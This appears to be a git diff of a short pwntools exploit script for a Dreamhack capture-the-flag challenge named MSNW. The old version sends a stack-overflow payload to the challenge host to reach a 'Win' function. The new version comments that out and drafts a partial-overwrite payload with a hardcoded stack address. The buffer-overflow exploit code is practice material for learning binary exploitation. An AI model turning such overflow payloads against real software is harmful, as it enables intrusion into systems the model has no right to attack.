@@ -1,16 +1,20 @@
-from pwn import *
+# from pwn import *
 
-port = 21642
-rem = remote("host3.dreamhack.games", port)
+# port = 1234
+# rem = remote("localhost", port)
 
-elf = ELF("./Pwnable/MSNW/problem/deploy/msnw")
+# elf = ELF("./Pwnable/MSNW/problem/deploy/msnw")
 
-win_addr = elf.symbols['Win']
+# win_addr = elf.symbols['Win']
 
-payload = b'A' * 0x132
+# payload = b'A' * 48
+# payload += p64(0x7ffd9f8e44f0)
 # payload += p64(win_addr)
-rem.sendlineafter(b": ", payload)
+# payload += b'B' * (0x130 - len(payload))
+# payload += b'\xf0\x43'
+# # payload += p64(win_addr)
+# rem.sendafter(b": ", payload)
 
-# print(rem.recvn(20))
+# print(rem.recvall())
 
-print(b'A' * 0x132)
+print('A' * 0x130)
